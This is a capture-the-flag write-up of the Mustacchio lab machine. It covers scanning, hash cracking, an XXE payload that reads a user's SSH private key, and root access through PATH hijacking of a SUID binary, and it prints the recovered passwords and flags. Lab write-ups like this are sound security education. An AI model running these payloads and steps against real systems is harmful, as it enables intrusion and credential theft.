# Mustacchio Write-up

## Enumeration

I started by identifying the target IP address:

```text
10.130.166.170
```

I then ran an Nmap scan:

```bash
nmap -sC -sV -p- 10.130.166.170
```

Three ports were open:

```text
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
```

## Port 80: Web Enumeration

I accessed the web server:

```text
http://10.130.166.170
```

While enumerating the website, I found:

```text
http://10.130.166.170/custom/js/
```

Inside this directory, I discovered a file called:

```text
users.bak
```

I downloaded it and checked its file type. It was a SQLite database.

I opened it using `sqlite3`:

```bash
sqlite3 users.bak
```

Then I checked the available tables:

```sql
.tables
```

The database contained a `users` table:

```text
users
```

I queried the table:

```sql
SELECT * FROM users;
```

The result was:

```text
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

The second value was a SHA-1 hash.

## Cracking the Password

I saved the hash into a file:

```bash
nano admin-hash.txt
```

Then I used John the Ripper with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt admin-hash.txt
```

I checked the cracked password:

```bash
john --show admin-hash.txt
```

The result was:

```text
?:bulldog19
```

Therefore, I obtained the following credentials:

```text
Username: admin
Password: bulldog19
```

## Port 8765: Admin Panel

I then accessed the service running on port 8765:

```text
http://10.130.166.170:8765/
```

After logging into the admin panel, I inspected the source code.

I found an interesting comment:

```html
<!-- Barry, you can now SSH in using your key!-->
```

This revealed a potential username:

```text
barry
```

I also found another interesting comment in the source code:

```javascript
//document.cookie = "Example=/auth/dontforget.bak";
```

I accessed the referenced `dontforget.bak` file.

The file contained XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>...</com>
</comment>
```

This was useful because the website contained a comment form that accepted XML, allowing me to understand the expected XML structure.

## XXE: Reading the SSH Private Key

I tested the XML parser for an XXE vulnerability.

I submitted:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

The application processed the external entity and returned the contents of Barry's SSH private key.

I saved the key as:

```text
ssh-key
```

I then restricted its permissions:

```bash
chmod 600 ssh-key
```

## Cracking the SSH Key Passphrase

Since the private key was protected by a passphrase, I converted it into a format that John the Ripper could process:

```bash
ssh2john ssh-key > hash.txt
```

I then used John with `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

After the cracking process, I checked the result:

```bash
john --show hash.txt
```

The passphrase was:

```text
urieljames
```

## SSH Access

I used the recovered private key to connect as Barry:

```bash
ssh -i ssh-key barry@10.130.166.170
```

After successfully logging in, I checked the home directory and found the user flag:

```bash
cat user.txt
```

```text
62d77a4d5f97d47c5aa38b3b2651b831
```

## Privilege Escalation

I then checked the other users on the system:

```bash
cd /home
ls
```

```text
barry  joe
```

Inside Joe's home directory, I found:

```text
live_log
```

I inspected the binary:

```bash
strings live_log
```

Among the output, I found that it uses:

```text
tail -f /var/log/nginx/access.log
```

I also checked my current `PATH`:

```bash
echo $PATH
```

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

The important point was that `live_log` executes `tail` without using an absolute path.

I therefore modified the `PATH` so that `/home/barry` was searched first:

```bash
export PATH=/home/barry:$PATH
```

I verified the change:

```bash
echo $PATH
```

```text
/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

## Exploiting the SUID Binary

I created my own `tail` executable in `/home/barry`:

```bash
nano tail
```

with the following content:

```bash
#!/bin/bash
/bin/bash
```

I then made it executable:

```bash
chmod +x tail
```

Because `/home/barry` was at the beginning of my `PATH`, `live_log` would find my malicious `tail` instead of the legitimate `/usr/bin/tail`.

I executed:

```bash
./live_log
```

This gave me a root shell:

```text
root@mustacchio:/home/joe#
```

I verified my privileges:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1003(barry)
```

And:

```bash
whoami
```

```text
root
```

## Root Flag

Finally, I read the root flag:

```bash
cat /root/root.txt
```

```text
3223581420d906c4dd1a5f9b530393a5
```

## Conclusion

The machine was compromised through several stages:

1. Enumerated the web server and discovered `users.bak`.
    
2. Extracted the admin SHA-1 hash from the SQLite database.
    
3. Cracked the hash to obtain the admin password.
    
4. Accessed the service on port 8765.
    
5. Discovered the Barry SSH clue and the XML structure.
    
6. Exploited XXE to read Barry's SSH private key.
    
7. Cracked the SSH key's passphrase and logged in as Barry.
    
8. Discovered the SUID `live_log` binary.
    
9. Exploited its use of `tail` through `PATH` hijacking.
    
10. Obtained a root shell and retrieved the root flag.